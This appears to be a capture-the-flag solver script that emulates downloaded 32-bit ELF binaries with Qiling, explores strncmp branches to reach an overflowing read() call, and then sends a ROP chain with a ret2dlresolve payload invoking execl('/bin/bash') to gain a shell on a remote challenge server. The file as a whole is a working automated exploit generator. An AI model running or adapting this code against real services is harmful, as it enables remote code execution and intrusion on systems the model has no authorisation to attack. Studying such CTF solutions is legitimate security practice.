from qiling import *
from qiling.os.const import *
from pwn import *
import os
from io import BytesIO
from grail_ret2dlresolve import CustomRet2dlresolvePayload

HOLYGRAIL_ROOTFS = os.path.join(os.path.expanduser("~"), "rootfs", "x86_linux")
STRNCMP_MATCH = 0
STRNCMP_NOMATCH = 1

class StrncmpNode:
    def __init__(self, s, addr, regs):
        self.arg = s
        self.addr = addr
        self.parent = None
        self.children = [None, None]
        self.regs = regs
        self.visited = 0

class StrncmpGraph:
    def __init__(self):
        self.curr_node = StrncmpNode("", 0, None) 
        self.curr_direction = STRNCMP_MATCH
        self.node_addrs = {}
        self.target = None

def read_hook(ql, graph):
    parms = ql.os.resolve_fcall_params({'fd': INT, 'buf': POINTER, 'len': INT})
    ebp = ql.reg.ebp
    buf = parms['buf']
    buflen = parms['len']
    if buf + buflen > ebp:
        graph.target = (graph.curr_node,graph.curr_direction,(ql.reg.ebp + 4 - buf,buflen))
        ql.stop()
    return buflen

def strncmp_hook(ql, graph):
    parms = ql.os.resolve_fcall_params({'s1': STRING, 's2': STRING, 'n': INT})
    s = parms['s1']
    addr = ql.unpack32(ql.mem.read(ql.reg.esp, 4))
    if not addr in graph.node_addrs:
        new_node = StrncmpNode(s, addr, ql.reg.save())
        curr_node = graph.curr_node
        curr_direction = graph.curr_direction
        curr_node.children[curr_direction] = new_node
        new_node.parent = curr_node
        graph.node_addrs[addr] = new_node
    for node in graph.node_addrs.values():
        if node.visited > 2:
            continue
        if node.children[STRNCMP_MATCH] is None:
            ql.reg.restore(node.regs)
            ql.reg.eax = 0
            ql.reg.eip = node.addr
            graph.curr_direction = STRNCMP_MATCH
            graph.curr_node = node
            node.visited += 1
            break
        elif node.children[STRNCMP_NOMATCH] is None:
            ql.reg.restore(node.regs)
            ql.reg.eax = 1
            ql.reg.eip = node.addr
            graph.curr_direction = STRNCMP_NOMATCH
            graph.curr_node = node
            node.visited += 1
            break
    return 0


def analyze(exepath):
    graph = StrncmpGraph()
    ql = Qiling([exepath], HOLYGRAIL_ROOTFS, console=False)
    ql.set_api('read', (lambda ql: read_hook(ql, graph)))
    ql.set_api('strncmp', (lambda ql: strncmp_hook(ql, graph)))
    ql.run()

    payloads = []
    node, direction,len_info = graph.target
    while node.addr != 0:
        if direction == STRNCMP_MATCH:
            payloads.append(node.arg.encode() + b"\n")
        else:
            payloads.append(node.arg[::-1].encode() + b"\n")
        direction = node.parent.children.index(node)
        node = node.parent
    return payloads[::-1],len_info

def read_headers(sock):
    for i in range(4):
        print(sock.recvline().decode(), end="")

def read_elf(sock, exepath):
    sock.recvline()
    line = sock.recvline()
    elf_bytes = b''
    delim_char = b'*'[0]
    while not all(c == delim_char for c in line.strip()):
         elf_bytes += line
         line = sock.recvline()
    with open(exepath, 'wb') as fp:
        fp.write(elf_bytes)

def exploit(payloads, len_info, exepath, sock):
    binary = ELF(exepath)
    rop = ROP(binary)
    dlresolve = CustomRet2dlresolvePayload(binary, symbol="execl", args=["/bin/bash", "/bin/bash", 0])
    rop.read(0, dlresolve.data_addr, len(dlresolve.payload))
    rop.ret2dlresolve(dlresolve)
    raw_rop = rop.chain()
    padding_len, read_len = len_info
    total_payload = b"".join(payloads) + flat({padding_len: raw_rop, read_len: dlresolve.payload})
    sock.send(total_payload)
    sock.sendline(b'echo DONE >log')
    sock.sendline(b'exit')

def find_holy_grails(sock):
    read_headers(sock)
    exepath = 'grailtest'
    for i in range(5):
        read_elf(sock, exepath)
        payloads, len_info = analyze(exepath)
        exploit(payloads, len_info, exepath, sock)
        s = sock.recvline()
        print(s.decode(), end="")
        if s.strip() != b"YOU FOUND THE HOLY GRAIL!":
            break
    data = sock.recvall()
    print(data.decode())
    

if __name__ == "__main__":
    sock = remote('ctf.battelle.org', 30042)
    find_holy_grails(sock)
    sock.close()
    
    
